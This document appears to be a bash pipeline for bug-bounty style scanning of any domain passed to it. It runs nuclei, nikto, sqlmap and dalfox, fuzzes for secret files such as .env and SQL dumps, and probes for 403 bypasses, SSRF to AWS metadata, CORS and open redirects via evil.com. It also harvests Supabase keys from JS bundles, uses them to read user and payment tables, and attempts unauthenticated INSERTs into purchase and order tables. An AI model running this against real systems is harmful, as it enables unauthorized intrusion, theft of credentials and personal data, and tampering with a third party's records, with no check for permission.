#!/bin/bash
# Vulnerability scanning pipeline
# Usage: ./scan.sh <domain> <recon_dir> <output_dir>

set -euo pipefail

DOMAIN="${1:?Usage: scan.sh <domain> <recon_dir> <output_dir>}"
RECON_DIR="${2:?Usage: scan.sh <domain> <recon_dir> <output_dir>}"
OUTPUT_DIR="${3:?Usage: scan.sh <domain> <recon_dir> <output_dir>}"

mkdir -p "$OUTPUT_DIR"
TARGET="https://$DOMAIN"
LIVE_HOSTS="$RECON_DIR/live_hosts.txt"

echo "[*] Starting vulnerability scan: $DOMAIN"

# ─── NUCLEI (CVE, misconfigs, exposed panels, takeover, backup files) ─────────

echo "[*] [1/12] Nuclei full scan (stock + custom templates)..."
SCRIPT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CUSTOM_TEMPLATES="$SCRIPT_ROOT/nuclei-templates-custom"
NUCLEI_FLAGS=(-silent -severity low,medium,high,critical -j -o "$OUTPUT_DIR/nuclei.json")
if [ -d "$CUSTOM_TEMPLATES" ]; then
    NUCLEI_FLAGS+=(-t "$CUSTOM_TEMPLATES")
fi

if [ -f "$LIVE_HOSTS" ]; then
    awk '{print $1}' "$LIVE_HOSTS" | nuclei "${NUCLEI_FLAGS[@]}" 2>/dev/null || echo "  nuclei failed"
else
    nuclei -u "$TARGET" "${NUCLEI_FLAGS[@]}" 2>/dev/null || echo "  nuclei failed"
fi

# ─── NIKTO ────────────────────────────────────────────────────────────────────

echo "[*] [2/12] Nikto..."
nikto -h "$TARGET" -ask no -nointeractive \
    -output "$OUTPUT_DIR/nikto.txt" 2>/dev/null || echo "  nikto failed"

# ─── BACKUP FILES & SENSITIVE PATHS ───────────────────────────────────────────

echo "[*] [3/12] Backup files & sensitive paths fuzzing..."
cat > "$OUTPUT_DIR/sensitive_wordlist.txt" <<EOF
.env
.env.local
.env.production
.env.backup
.git/config
.git/HEAD
.svn/entries
.htaccess
.htpasswd
backup.zip
backup.tar.gz
backup.sql
db.sql
dump.sql
database.sql
config.php.bak
config.php~
wp-config.php.bak
admin.zip
site.zip
phpinfo.php
info.php
test.php
adminer.php
phpmyadmin/
phpMyAdmin/
adminer/
admin/
swagger.json
swagger.yaml
openapi.json
openapi.yaml
api-docs
api/v1/
api/v2/
graphql
graphiql
.DS_Store
.vscode/
.idea/
robots.txt
sitemap.xml
EOF

ffuf -u "${TARGET}/FUZZ" -w "$OUTPUT_DIR/sensitive_wordlist.txt" \
    -mc 200,301,302,401,403 -t 20 -s \
    -of json -o "$OUTPUT_DIR/sensitive_paths.json" 2>/dev/null || echo "  ffuf failed"

# Additional fuzz on SecLists raft-medium-words
SECLISTS_PATHS="${SECLISTS:-/opt/seclists}/Discovery/Web-Content/raft-medium-words.txt"
if [ -f "$SECLISTS_PATHS" ]; then
    echo "[*] [3b/12] Extended path discovery (SecLists raft-medium)..."
    ffuf -u "${TARGET}/FUZZ" -w "$SECLISTS_PATHS" \
        -mc 200,301,302,401,403 -t 30 -s -timeout 8 \
        -of json -o "$OUTPUT_DIR/seclists_paths.json" 2>/dev/null || true
fi

# ─── SQL INJECTION ────────────────────────────────────────────────────────────

echo "[*] [4/12] SQL injection (sqlmap on common params)..."
sqlmap -u "$TARGET/?id=1" --batch --random-agent --level=2 --risk=1 \
    --output-dir="$OUTPUT_DIR/sqlmap" 2>/dev/null || echo "  sqlmap nothing or failed"

# ─── XSS ──────────────────────────────────────────────────────────────────────

echo "[*] [5/12] XSS (dalfox)..."
if [ -f "$RECON_DIR/wayback_urls.txt" ]; then
    grep -E '\?[a-zA-Z]+=' "$RECON_DIR/wayback_urls.txt" 2>/dev/null \
        | head -100 \
        | dalfox pipe --silence -o "$OUTPUT_DIR/dalfox.txt" 2>/dev/null \
        || echo "  dalfox failed"
fi

# ─── HIDDEN PARAMETERS ────────────────────────────────────────────────────────

echo "[*] [6/12] Hidden parameter discovery (arjun)..."
arjun -u "$TARGET" -oJ "$OUTPUT_DIR/arjun.json" 2>/dev/null || echo "  arjun failed"

# ─── CORS MISCONFIG ───────────────────────────────────────────────────────────

echo "[*] [7/12] CORS misconfiguration check..."
{
    echo "=== CORS check for $TARGET ==="
    CORS_HEADER=$(curl -s -H "Origin: https://evil.com" -I "$TARGET" 2>/dev/null \
        | grep -i "access-control-allow-origin" || echo "no CORS headers")
    echo "$CORS_HEADER"
    if echo "$CORS_HEADER" | grep -qi "evil.com"; then
        echo "[VULN] CORS reflects arbitrary origin — Origin: evil.com accepted"
    fi

    CREDS_HEADER=$(curl -s -H "Origin: https://evil.com" -I "$TARGET" 2>/dev/null \
        | grep -i "access-control-allow-credentials" || echo "")
    if echo "$CREDS_HEADER" | grep -qi "true" && echo "$CORS_HEADER" | grep -qi "evil.com"; then
        echo "[CRITICAL] CORS + credentials = data theft possible"
    fi
} > "$OUTPUT_DIR/cors.txt"

# ─── 403/401 BYPASS ───────────────────────────────────────────────────────────

echo "[*] [8/12] 403/401 bypass attempts..."
{
    for path in admin api/admin api/v1/admin internal private; do
        URL="$TARGET/$path"
        BASE=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
        if [[ "$BASE" == "403" || "$BASE" == "401" ]]; then
            echo "=== Trying bypass for: $URL (base=$BASE) ==="
            for header in "X-Original-URL: /$path" "X-Forwarded-For: 127.0.0.1" \
                          "X-Real-IP: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1"; do
                CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET/")
                if [[ "$CODE" == "200" ]]; then
                    echo "[VULN] Bypass via header: $header → 200 OK"
                fi
            done
            for variant in "/$path/" "/$path%20" "/$path/." "/$path..;/" "/$path/?"; do
                CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$variant")
                if [[ "$CODE" == "200" ]]; then
                    echo "[VULN] Bypass via path variant: $variant → 200 OK"
                fi
            done
        fi
    done
} > "$OUTPUT_DIR/bypass_403.txt"

# ─── GRAPHQL INTROSPECTION ────────────────────────────────────────────────────

echo "[*] [9/12] GraphQL introspection..."
{
    for ep in graphql graphiql api/graphql v1/graphql; do
        URL="$TARGET/$ep"
        RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" \
            -d '{"query":"{__schema{types{name}}}"}' "$URL" 2>/dev/null)
        if echo "$RESPONSE" | grep -q "__schema"; then
            echo "[VULN] GraphQL introspection enabled at: $URL"
            echo "$RESPONSE" | head -c 500
            echo ""
        fi
    done
} > "$OUTPUT_DIR/graphql.txt"

# ─── SSRF QUICK CHECK ─────────────────────────────────────────────────────────

echo "[*] [10/12] SSRF quick check on common params..."
{
    for param in url redirect next image avatar fetch proxy; do
        URL="$TARGET/?$param=http://169.254.169.254/latest/meta-data/"
        RESPONSE=$(curl -s --max-time 10 "$URL" 2>/dev/null | head -c 1000)
        if echo "$RESPONSE" | grep -qE "(ami-id|instance-id|iam/|hostname)"; then
            echo "[CRITICAL] SSRF + AWS metadata leak via param: $param"
            echo "URL: $URL"
        fi
    done
} > "$OUTPUT_DIR/ssrf.txt"

# ─── OPEN REDIRECT ────────────────────────────────────────────────────────────

echo "[*] [11/12] Open redirect check..."
{
    for param in url redirect next return returnUrl redirect_uri continue; do
        URL="$TARGET/?$param=https://evil.com"
        LOCATION=$(curl -s -o /dev/null -w "%{redirect_url}" "$URL" 2>/dev/null)
        if echo "$LOCATION" | grep -qi "evil.com"; then
            echo "[VULN] Open redirect via param: $param → $LOCATION"
        fi
    done
} > "$OUTPUT_DIR/open_redirect.txt"

# ─── SUBDOMAIN TAKEOVER (extra check via nuclei) ──────────────────────────────

echo "[*] [12/12] Subdomain takeover (nuclei templates)..."
if [ -f "$RECON_DIR/all_subdomains.txt" ]; then
    nuclei -l "$RECON_DIR/all_subdomains.txt" -t http/takeovers/ -silent \
        -j -o "$OUTPUT_DIR/takeover_nuclei.json" 2>/dev/null || echo "  no takeovers"
fi

# ─── SUPABASE CREDENTIAL DETECTION ───────────────────────────────────────────

echo "[*] [13/13] Supabase credential detection in JS bundles..."
{
    echo "=== Supabase scan for $TARGET ==="

    # Collect JS bundle URLs from the page
    JS_URLS=$(curl -s --max-time 15 "$TARGET" 2>/dev/null \
        | grep -oE '"[^"]+\.js[^"]*"' | tr -d '"' \
        | grep -v "^http" | sed "s|^|$TARGET|" | head -30)

    # Also check _next/static manifest for Next.js apps
    BUILD_MANIFEST=$(curl -s --max-time 10 "$TARGET/_next/static/$(curl -s "$TARGET" 2>/dev/null | grep -oE '_next/static/[^/]+/_buildManifest' | head -1 | xargs basename 2>/dev/null || echo '')" 2>/dev/null | head -c 200 || true)

    SUPABASE_URL=""
    SUPABASE_KEY=""

    for js_url in $JS_URLS; do
        CHUNK=$(curl -s --max-time 10 "$js_url" 2>/dev/null | head -c 200000)
        SB_URL=$(echo "$CHUNK" | grep -oE 'https://[a-z0-9]+\.supabase\.co' | head -1)
        if [[ -n "$SB_URL" ]]; then
            # Try new sb_publishable_ format first, then legacy JWT anon key
            SB_KEY=$(echo "$CHUNK" | grep -oP '(?<=sb_publishable_)[A-Za-z0-9_-]+' | head -1)
            if [[ -z "$SB_KEY" ]]; then
                SB_KEY=$(echo "$CHUNK" | grep -oP 'eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
            fi
            if [[ -n "$SB_KEY" ]]; then
                SUPABASE_URL="$SB_URL"
                SUPABASE_KEY="sb_publishable_$SB_KEY"
                [[ "$SB_KEY" == eyJ* ]] && SUPABASE_KEY="$SB_KEY"
                echo "[FOUND] Supabase credentials in: $js_url"
                echo "  URL: $SUPABASE_URL"
                echo "  Key: ${SUPABASE_KEY:0:40}..."
                break
            fi
        fi
    done

    if [[ -n "$SUPABASE_URL" && -n "$SUPABASE_KEY" ]]; then
        # Test unauthenticated REST access
        echo ""
        echo "[*] Testing unauthenticated Supabase RLS..."
        for table in users profiles accounts purchases orders payments; do
            RESP=$(curl -s --max-time 8 \
                -H "apikey: $SUPABASE_KEY" \
                -H "Authorization: Bearer $SUPABASE_KEY" \
                "$SUPABASE_URL/rest/v1/$table?limit=1" 2>/dev/null)
            if echo "$RESP" | grep -qE '^\[|^\{'; then
                if echo "$RESP" | grep -qE '"id"|"email"|"user_id"'; then
                    echo "[CRITICAL] RLS bypass or open read: table='$table'"
                    echo "  Response preview: ${RESP:0:200}"
                elif echo "$RESP" | grep -q '"hint"'; then
                    HINT=$(echo "$RESP" | grep -oP '"hint":"[^"]+"')
                    echo "[INFO] Table hint from '$table': $HINT"
                fi
            fi
        done

        echo ""
        echo "[*] Testing unauthorized INSERT (RLS write bypass)..."
        FAKE_UUID="00000000-0000-0000-0000-000000000001"
        for table in purchases orders; do
            INSERT_RESP=$(curl -s --max-time 8 -X POST \
                -H "apikey: $SUPABASE_KEY" \
                -H "Authorization: Bearer $SUPABASE_KEY" \
                -H "Content-Type: application/json" \
                -H "Prefer: return=representation" \
                -d "{\"user_id\":\"$FAKE_UUID\",\"product\":\"test_bbt\",\"status\":\"active\"}" \
                "$SUPABASE_URL/rest/v1/$table" 2>/dev/null)
            if echo "$INSERT_RESP" | grep -qE '"id"'; then
                echo "[CRITICAL] Unauthenticated INSERT succeeded on table='$table'"
                echo "  Response: ${INSERT_RESP:0:300}"
            elif echo "$INSERT_RESP" | grep -qi "permission denied\|not allowed\|rls"; then
                echo "[INFO] RLS active on '$table' — INSERT blocked (good)"
            fi
        done
    else
        echo "No Supabase credentials found in JS bundles."
    fi
} > "$OUTPUT_DIR/supabase.txt"
SUPABASE_CRITS=$(grep -c "CRITICAL" "$OUTPUT_DIR/supabase.txt" 2>/dev/null || echo 0)

# ─── SUMMARY JSON ─────────────────────────────────────────────────────────────

NUCLEI_COUNT=$(wc -l < "$OUTPUT_DIR/nuclei.json" 2>/dev/null || echo 0)
SSRF_HITS=$(grep -c "CRITICAL" "$OUTPUT_DIR/ssrf.txt" 2>/dev/null || echo 0)
CORS_HITS=$(grep -c "VULN\|CRITICAL" "$OUTPUT_DIR/cors.txt" 2>/dev/null || echo 0)
BYPASS_HITS=$(grep -c "VULN" "$OUTPUT_DIR/bypass_403.txt" 2>/dev/null || echo 0)
GRAPHQL_HITS=$(grep -c "VULN" "$OUTPUT_DIR/graphql.txt" 2>/dev/null || echo 0)
REDIRECT_HITS=$(grep -c "VULN" "$OUTPUT_DIR/open_redirect.txt" 2>/dev/null || echo 0)
TAKEOVER_HITS=$(wc -l < "$OUTPUT_DIR/takeover_nuclei.json" 2>/dev/null || echo 0)

cat > "$OUTPUT_DIR/scan_summary.json" <<EOF
{
  "domain": "$DOMAIN",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "findings": {
    "nuclei": $NUCLEI_COUNT,
    "ssrf_critical": $SSRF_HITS,
    "cors_issues": $CORS_HITS,
    "bypass_403": $BYPASS_HITS,
    "graphql_introspection": $GRAPHQL_HITS,
    "open_redirect": $REDIRECT_HITS,
    "subdomain_takeover": $TAKEOVER_HITS,
    "supabase_critical": $SUPABASE_CRITS
  }
}
EOF

echo "[+] Scan complete:"
echo "    Nuclei findings    : $NUCLEI_COUNT"
echo "    SSRF critical      : $SSRF_HITS"
echo "    CORS issues        : $CORS_HITS"
echo "    403/401 bypass     : $BYPASS_HITS"
echo "    GraphQL exposed    : $GRAPHQL_HITS"
echo "    Open redirect      : $REDIRECT_HITS"
echo "    Subdomain takeover : $TAKEOVER_HITS"
echo "    Supabase critical  : $SUPABASE_CRITS"
